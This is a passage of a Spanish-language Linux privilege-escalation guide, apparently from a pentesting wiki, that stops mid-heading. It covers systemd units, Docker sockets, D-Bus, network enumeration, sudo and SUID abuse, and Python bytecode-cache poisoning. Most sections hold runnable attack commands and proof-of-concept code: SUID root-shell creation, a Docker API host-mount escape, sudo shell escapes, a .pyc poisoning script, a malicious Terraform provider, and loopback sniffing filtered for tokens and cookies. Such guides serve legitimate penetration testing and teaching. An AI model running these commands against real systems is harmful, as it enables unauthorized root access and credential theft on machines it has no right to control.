```

## Servicios

### Archivos _.service_ con permisos de escritura

Comprueba si puedes escribir en algún archivo `.service`; si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, **reinicie** o **detenga** (quizá tengas que esperar a que se reinicie la máquina).\
Por ejemplo, crea tu backdoor dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicios con permisos de escritura

Ten en cuenta que, si tienes **permisos de escritura sobre los binarios que ejecutan los servicios**, puedes sustituirlos por backdoors para que estos se ejecuten cuando se vuelvan a ejecutar los servicios.

### PATH de systemd - Rutas relativas

Puedes ver el PATH que usa **systemd** con:

```bash
systemctl show-environment
```

Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, es posible que puedas **escalar privilegios**. Debes buscar **rutas relativas utilizadas en archivos de configuración de servicios** como:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Luego, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro de la carpeta PATH de systemd en la que puedas escribir, y cuando se le pida al servicio que ejecute la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **backdoor** (normalmente, los usuarios sin privilegios no pueden iniciar ni detener servicios, pero comprueba si puedes usar `sudo -l`).

**Obtén más información sobre los servicios con `man systemd.service`.**

## **Timers**

Los **Timers** son archivos de unidad de systemd cuyos nombres terminan en `**.timer**` y que controlan archivos `**.service**` o eventos. Los **Timers** pueden usarse como alternativa a cron, ya que tienen compatibilidad integrada con eventos de calendario y eventos monotónicos, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los timers con:

```bash
systemctl list-timers --all
```

### Timers modificables

Si puedes modificar un timer, puedes hacer que ejecute algunas unidades existentes de systemd.unit (como un `.service` o un `.target`).

```bash
Unit=backdoor.service
```

En la documentación puedes leer qué es la unidad:

> La unidad que se activará cuando expire este temporizador. El argumento es el nombre de una unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor toma de forma predeterminada una unidad de servicio que tenga el mismo nombre que la unidad del temporizador, sin el sufijo. (Consulta lo anterior). Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador sean idénticos, salvo por el sufijo.

Por lo tanto, para abusar de este permiso tendrías que:

- Encontrar alguna unidad de systemd (como un `.service`) que **ejecute un binario modificable**
- Encontrar alguna unidad de systemd que **ejecute una ruta relativa** y tener **permisos de escritura** sobre el **PATH de systemd** (para suplantar ese ejecutable)

**Obtén más información sobre los temporizadores con `man systemd.timer`.**

### **Habilitar un temporizador**

Para habilitar un temporizador necesitas privilegios de root y ejecutar:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Observa que el **timer** se **activa** al crear un enlace simbólico hacia él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Los Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma máquina o en máquinas diferentes dentro de modelos cliente-servidor. Utilizan archivos de descriptor Unix estándar para la comunicación entre computadoras y se configuran mediante archivos `.socket`.<sup>[[14]](#references)</sup>

Los sockets se pueden configurar mediante archivos `.socket`.

**Obtén más información sobre los sockets con `man systemd.socket`.** En este archivo se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero en resumen **indican dónde escuchará** el socket (la ruta del archivo de socket AF_UNIX, la dirección IPv4/6 y/o el número de puerto en los que escuchará, etc.).
- `Accept`: Acepta un argumento booleano. Si es **true**, se **inicia una instancia de servicio por cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, todos los sockets de escucha **se pasan a la unidad de servicio iniciada**, y se inicia una sola unidad de servicio para todas las conexiones. Este valor se ignora para sockets de datagramas y FIFOs, donde una sola unidad de servicio gestiona incondicionalmente todo el tráfico entrante. **El valor predeterminado es false**. Por razones de rendimiento, se recomienda escribir nuevos daemons únicamente de forma que sean compatibles con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comandos que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **creen** y se asocien, respectivamente. El primer elemento de la línea de comandos debe ser una ruta absoluta; a continuación, deben ir los argumentos del proceso.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **cierren** y eliminen, respectivamente.
- `Service`: Especifica el nombre de la unidad de **servicio que se activará** cuando haya **tráfico entrante**. Esta opción solo se permite para sockets con Accept=no. De forma predeterminada, se usa el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Archivos .socket con permisos de escritura

Si encuentras un archivo `.socket` con **permisos de escritura**, puedes **añadir** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y la backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente tendrás que esperar a que se reinicie la máquina.**\
_Ten en cuenta que el sistema debe estar usando la configuración de ese archivo socket o la backdoor no se ejecutará._

### Activación de sockets + ruta de unidad con permisos de escritura (crear el servicio que falta)

Otra configuración incorrecta de alto impacto es:

- una unidad socket con `Accept=no` y `Service=<name>.service`
- falta la unidad de servicio indicada
- un atacante puede escribir en `/etc/systemd/system` (o en otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service` y luego enviar tráfico al socket para que systemd cargue y ejecute el nuevo servicio como root.

Flujo rápido:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets con permisos de escritura

Si **identificas algún socket con permisos de escritura** (_ahora hablamos de sockets Unix, no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar sockets Unix

```bash
netstat -a -p --unix
```

### Conexión sin procesar

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Ejemplo de explotación:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets escuchando solicitudes HTTP** (_no me refiero a archivos .socket, sino a archivos que actúan como sockets de Unix_). Puedes comprobarlo con:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Si el socket **responde con una solicitud HTTP**, puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Docker Socket escribible

El socket de Docker, que suele encontrarse en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. De forma predeterminada, el usuario `root` y los miembros del grupo `docker` pueden escribir en él. Tener acceso de escritura a este socket puede provocar una escalada de privilegios. A continuación se explica cómo hacerlo y se presentan métodos alternativos por si Docker CLI no está disponible.

#### **Escalada de privilegios con Docker CLI**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios con los siguientes comandos:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Estos comandos te permiten ejecutar un contenedor con acceso de nivel root al sistema de archivos del host.

#### **Usar la API de Docker directamente**

Cuando la CLI de Docker no está disponible, aún se puede abusar del socket de Docker mediante HTTP sin procesar a través del socket Unix. El flujo más fiable es:

- crear un contenedor auxiliar de larga duración con el directorio raíz del host montado mediante bind
- iniciarlo
- crear una instancia de `exec` dentro de ese contenedor auxiliar
- iniciar la instancia de `exec` y leer la salida a través de la API

**Listar imágenes de Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Crear e iniciar un contenedor auxiliar**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Crear una instancia de exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Inicia la instancia de exec y lee la salida**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Este patrón suele ser más robusto que intentar controlar `attach` manualmente con `socat` o `nc -U`. Una vez que puedas crear un helper con `/:/host`, puedes usar instancias adicionales de `exec` para leer archivos como `/host/root/...`, añadir claves SSH en `/host/root/.ssh` o modificar archivos de inicio del host.

### Otros

Ten en cuenta que, si tienes permisos de escritura sobre el socket de docker porque estás **dentro del grupo `docker`**, tienes [**más formas de escalar privilegios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si la [**API de docker está escuchando en un puerto**, también podrías comprometerla](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de los contenedores o abusar de los runtimes de contenedores para escalar privilegios** en:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalada de privilegios con Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página, ya que **es posible que puedas abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalada de privilegios con **RunC**

Si descubres que puedes usar el comando **`runc`**, lee la siguiente página, ya que **es posible que puedas abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado **sistema de comunicación entre procesos (IPC)** que permite que las aplicaciones interactúen y compartan datos de forma eficiente. Diseñado para los sistemas Linux modernos, ofrece un framework robusto para distintos tipos de comunicación entre aplicaciones.<sup>[[16]](#references)</sup>

El sistema es versátil: admite IPC básico que mejora el intercambio de datos entre procesos, de forma similar a los **sockets de dominio UNIX mejorados**. Además, permite difundir eventos o señales, lo que facilita la integración entre componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música silencie el audio, mejorando la experiencia del usuario. Asimismo, D-Bus admite un sistema de objetos remotos que simplifica las solicitudes de servicios y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona con un **modelo de permitir/denegar** que administra los permisos de los mensajes (llamadas a métodos, emisiones de señales, etc.) según el efecto acumulado de las reglas de política coincidentes. Estas políticas especifican las interacciones con el bus y, potencialmente, permiten escalar privilegios mediante la explotación de dichos permisos.

A continuación se muestra un ejemplo de una política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, que detalla los permisos del usuario root para poseer, enviar y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las políticas sin un usuario o grupo especificado se aplican de forma universal, mientras que las políticas de contexto «predeterminado» se aplican a todo lo que no esté cubierto por otras políticas específicas.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Aprende a enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Si una entrada activa de `/etc/inetd.conf` ejecuta GNU Inetutils `telnetd` como root, comprueba la versión del binario configurado y el listener local, incluso cuando el puerto está enlazado solo a loopback. GNU Inetutils de la versión 1.9.3 a la 2.7 tenía un [bypass de autenticación de Telnet](https://seclists.org/oss-sec/2026/q1/89) por el que el `USER` proporcionado por el cliente llegaba a `login -f` (CVE-2026-24061). Un proceso o una cadena de versión son indicadores; confirma el estado del parche del proveedor y cuál es el daemon real antes de considerarlo expuesto. La [guía de Telnet](../../../network-services-pentesting/pentesting-telnet.md) ofrece más detalles.

### Triaje rápido del filtrado de salida

Si el host puede ejecutar comandos, pero los callbacks fallan, distingue rápidamente entre filtrado de DNS, transporte, proxy y rutas:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Puertos abiertos

Comprueba siempre los servicios de red que se estén ejecutando en la máquina y con los que no pudiste interactuar antes de acceder a ella:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Clasifica los listeners según la dirección de enlace:

- `0.0.0.0` / `[::]`: expuestos en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo locales (buenos candidatos para túneles/port forwarding).
- IP internas específicas (p. ej., `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente accesibles solo desde segmentos internos.

### Flujo de triage de servicios solo locales

Cuando comprometes un host, los servicios enlazados a `127.0.0.1` suelen volverse accesibles por primera vez desde tu shell. Un flujo de trabajo local rápido es:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS como escáner de red (modo solo de red)

Además de las comprobaciones locales de PE, linPEAS puede funcionar como un escáner de red enfocado. Usa los binarios disponibles en `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (omitiendo el resto de las comprobaciones de escalada de privilegios).

### Sniffing

Comprueba si puedes capturar tráfico. Si puedes, podrías obtener algunas credenciales.

```
timeout 1 tcpdump
```

Comprobaciones prácticas rápidas:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios de uso exclusivamente interno exponen tokens/cookies/credenciales ahí:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Captura ahora, analiza después:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Usuarios

### Enumeración genérica

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en el sistema, cuáles pueden **login** y cuáles tienen **privilegios de root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID alto

Algunas versiones de Linux se vieron afectadas por un bug que permite a los usuarios con **UID > INT_MAX** escalar privilegios. Más información: [aquí](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aquí](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [aquí](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que pueda otorgarte privilegios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante en el portapapeles (si es posible)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Política de contraseñas

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** usando esa contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force de usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer brute-force de usuarios.

## Abusos de PATH con permisos de escritura

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta de $PATH**, podrías escalar privilegios **creando un backdoor dentro de la carpeta con permisos de escritura**, con el nombre de algún comando que vaya a ejecutar otro usuario (idealmente root) y que **no se cargue desde una carpeta ubicada antes de la carpeta con permisos de escritura en $PATH**.

### SUDO y SUID

Es posible que se te permita ejecutar algún comando usando sudo o que tenga el bit suid. Compruébalo usando:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando**.<sup>[[8]](#references)</sup> Por ejemplo:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

La configuración de sudo podría permitir a un usuario ejecutar ciertos comandos con los privilegios de otro usuario sin conocer la contraseña.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener una shell añadiendo una clave SSH al directorio de `root` o ejecutando `sh`.

```
sudo vim -c '!sh'
```

### Comparación de Bash sin comillas en un script de sudo

En Bash, el lado derecho de `[[ "$protected" == $candidate ]]` es un patrón. Si un script de sudo con capacidad para ejecutarse como root asigna `candidate` a partir de un archivo controlado por quien lo invoca, un valor como `prefix*` puede coincidir con el inicio de una cadena protegida. Distintas rutas de éxito y error podrían revelar entonces un oráculo de prefijos. Pon comillas en el lado derecho (`[[ "$protected" == "$candidate" ]]`) cuando se pretenda una igualdad literal. Revisa los argumentos reales de sudo, la procedencia de la entrada y el comportamiento observable de las ramas antes de considerar explotable una comparación sin comillas. El [manual de GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) define este comportamiento de patrones.

### Archivos de proyecto de PrusaSlicer con sudo

Conviene revisar una concesión de sudo sin restricciones y con capacidad para ejecutarse como root para `prusaslicer` o `prusa-slicer` si quien la invoca puede elegir el proyecto `.3mf` que se va a procesar. Un proyecto puede incluir un script de posprocesamiento que se ejecuta al exportar G-code; los proyectos manipulados podrían ejecutar comandos en PrusaSlicer hasta la versión 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Confirma la regla efectiva de sudo, la versión del binario y los parches del proveedor, el origen del proyecto y si la ruta de exportación pertinente se ejecuta antes de concluir que se puede alcanzar el límite de privilegios. Un argumento de proyecto fijo o una política `NOEXEC` efectiva pueden cambiar el resultado. El mero hecho de encontrar el programa de laminado instalado no demuestra que exista una vía de escalada de privilegios.

### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** al ejecutar algo:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Este ejemplo, **basado en la máquina Admirer de HTB**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca arbitraria de Python mientras se ejecutaba el script como root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Envenenamiento de `__pycache__` / `.pyc` escribible en imports de Python permitidos por sudo

Si un **script de Python permitido por sudo** importa un módulo cuyo directorio del paquete contiene un **`__pycache__` escribible**, es posible que puedas reemplazar el `.pyc` en caché y conseguir code execution como el usuario privilegiado en la siguiente importación.<sup>[[30]](#references)</sup>

- Por qué funciona:
  - CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - El intérprete valida el **encabezado** (metadatos de magic + timestamp/hash vinculados al código fuente) y luego ejecuta el objeto de código serializado almacenado después de ese encabezado.
  - Si puedes **eliminar y volver a crear** el archivo en caché porque el directorio es escribible, puedes reemplazar un `.pyc` propiedad de root y que no es escribible.
- Ruta típica:
  - `sudo -l` muestra un script o wrapper de Python que puedes ejecutar como root.
  - Ese script importa un módulo local de `/opt/app/`, `/usr/local/lib/...`, etc.
  - El directorio `__pycache__` del módulo importado es escribible por tu usuario o por cualquiera.

Enumeración rápida:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Si puedes inspeccionar el script privilegiado, identifica los módulos importados y la ruta de caché:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Flujo de abuso:

1. Ejecuta una vez el script permitido por sudo para que Python cree el archivo de cache legítimo, si aún no existe.
2. Lee los primeros 16 bytes del `.pyc` legítimo y reutilízalos en el archivo envenenado.
3. Compila un objeto de código con el payload, aplica `marshal.dumps(...)`, elimina el archivo de cache original y vuelve a crearlo con el encabezado original seguido de tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido por sudo para que la importación ejecute tu payload como root.

Notas importantes:

- Reutilizar el encabezado original es clave porque Python comprueba los metadatos del cache con respecto al archivo fuente, no si el cuerpo del bytecode realmente coincide con el código fuente.
- Esto es especialmente útil cuando el archivo fuente pertenece a root y no se puede modificar, pero sí se puede escribir en el directorio `__pycache__` que lo contiene.
- `PYTHONDONTWRITEBYTECODE=1` y `python -B` impiden que Python escriba nuevos archivos `.pyc`; **no** impiden que cargue un cache ya válido que haya reemplazado un atacante. El límite crítico es si un usuario con menos privilegios puede reemplazar un cache que la importación privilegiada aceptará. Python comprueba los metadatos de fecha/hora y tamaño, o de hash, antes de cargar el bytecode en cache. Consulta la [referencia de importación de Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) y la [documentación de la línea de comandos](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Estructura mínima de prueba de concepto:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Asegúrate de que ningún directorio de la ruta de importación de Python con privilegios elevados tenga permisos de escritura para usuarios con pocos privilegios, incluido `__pycache__`.
- Audita la propiedad y los permisos de los directorios de caché, incluidos los archivos `.pyc` existentes. Deshabilitar la escritura de bytecode puede reducir la creación de nuevas cachés, pero no neutraliza una caché existente que se pueda reemplazar.
- Trata los módulos locales de Python y los directorios de caché con permisos de escritura igual que tratarías los scripts de shell o las bibliotecas compartidas con permisos de escritura que ejecuta root.

### BASH_ENV preservado mediante sudo env_keep → shell de root

Si sudoers conserva `BASH_ENV` (p. ej., `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio de Bash no interactivo para ejecutar código arbitrario como root al invocar un comando permitido.<sup>[[24]](#references)</sup>

- Por qué funciona: En shells no interactivos, Bash evalúa `$BASH_ENV` y obtiene el contenido de ese archivo antes de ejecutar el script de destino. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si sudo conserva `BASH_ENV`, tu archivo se obtiene con privilegios de root.<sup>[[23]](#references)</sup>

- Requisitos:
  - Una regla de sudo que puedas ejecutar (cualquier destino que invoque `/bin/bash` de forma no interactiva o cualquier script de bash).
  - `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Endurecimiento:
  - Elimina `BASH_ENV` (y `ENV`) de `env_keep`; prefiere `env_reset`.
  - Evita los wrappers de shell para los comandos permitidos por sudo; usa binarios mínimos.
  - Considera el registro de I/O de sudo y las alertas cuando se usan variables de entorno preservadas.

### Terraform mediante sudo con HOME preservado (!env_reset)

Cuando sudo permite ejecutar Terraform como un usuario con más privilegios, `!env_reset` es una señal para comprobar qué variables de entorno sobreviven realmente a esa regla. Confirma el `HOME` efectivo o `TF_CLI_CONFIG_FILE` antes de asumir que un `.terraformrc` o `terraform.rc` modificable por quien llama es la configuración activa de la CLI. Una entrada `provider_installation.dev_overrides` solo importa si el comando de Terraform especificado carga ese provider y quien llama puede colocar su ejecutable en el directorio seleccionado.<sup>[[25]](#references)</sup>

- Apunta el provider requerido a un directorio modificable y coloca un plugin malicioso con el nombre del provider (p. ej., `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform fallará en el handshake del plugin de Go, pero ejecutará el payload como root antes de detenerse y dejará una shell SUID.

### Sobrescrituras de TF_VAR + bypass de validación de symlinks

